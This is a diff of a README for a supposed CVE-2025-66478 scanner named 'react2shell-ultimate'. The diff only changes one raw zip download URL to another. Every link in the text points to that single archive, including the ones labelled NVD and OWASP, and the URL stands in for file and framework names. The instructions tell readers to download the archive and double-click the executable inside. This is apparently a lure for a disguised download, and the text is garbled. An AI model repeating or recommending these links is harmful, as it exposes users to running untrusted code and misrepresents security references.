@@ -1,10 +1,10 @@
 # 🛠️ react2shell-ultimate - Effortless CVE-2025-66478 Scanning
 
-[![Download react2shell-ultimate](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip%20Release&color=blue)](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip)
+[![Download react2shell-ultimate](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip%20Release&color=blue)](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip)
 
 ## 🌟 Description
 
-React2Shell Ultimate is a powerful scanner designed to check for vulnerabilities associated with CVE-2025-66478 specifically in https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip applications. It features multi-mode detection, WAF bypass capabilities, and local scanning options, making it crucial for cybersecurity professionals and bug bounty hunters.
+React2Shell Ultimate is a powerful scanner designed to check for vulnerabilities associated with CVE-2025-66478 specifically in https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip applications. It features multi-mode detection, WAF bypass capabilities, and local scanning options, making it crucial for cybersecurity professionals and bug bounty hunters.
 
 ## 🚀 Getting Started
 
@@ -14,11 +14,11 @@ Follow these simple steps to download and run React2Shell Ultimate. No programmi
 
 To get the latest version of React2Shell Ultimate, visit our Releases page:
 
-[Download from Releases](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip)
+[Download from Releases](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip)
 
 ### 2. Download the Software
 
-On the Releases page, you will see a list of available versions. Choose the latest version and click on the download link. The file should be clearly labeled for easy identification. It will usually be named something like `https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip` or `https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip` based on your operating system.
+On the Releases page, you will see a list of available versions. Choose the latest version and click on the download link. The file should be clearly labeled for easy identification. It will usually be named something like `https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip` or `https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip` based on your operating system.
 
 ### 3. Extract the Files
 
@@ -26,7 +26,7 @@ Once the download is complete, locate the downloaded file. It is often found in 
 
 ### 4. Run the Application
 
-Navigate to the folder where you extracted the files. Inside, look for the main executable file. It is typically named `https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip` for Windows or `react2shell-ultimate` for Mac. Double-click on it to run the application.
+Navigate to the folder where you extracted the files. Inside, look for the main executable file. It is typically named `https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip` for Windows or `react2shell-ultimate` for Mac. Double-click on it to run the application.
 
 ### 5. Follow the On-Screen Instructions
 
@@ -61,13 +61,13 @@ To learn more about CVE-2025-66478 and its implications, consider visiting cyber
 
 ### Additional Resources
 
-- **Vulnerability Database:** [NVD - CVE-2025-66478](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip)
-- **Best Security Practices:** [OWASP Top Ten](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip)
+- **Vulnerability Database:** [NVD - CVE-2025-66478](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip)
+- **Best Security Practices:** [OWASP Top Ten](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip)
 
 ## 🔗 Download & Install
 
 Now that you have all the necessary information, you can quickly get started with React2Shell Ultimate. Remember to visit the Releases page to download the latest version:
 
-[Download from Releases](https://github.com/Lennonxlz/react2shell-ultimate/raw/refs/heads/main/unintrusive/shell-ultimate-react-2.4.zip)
+[Download from Releases](https://raw.githubusercontent.com/Lennonxlz/react2shell-ultimate/main/unintrusive/shell_ultimate_react_v2.1.zip)
 
 Take control of your application security with React2Shell Ultimate today!
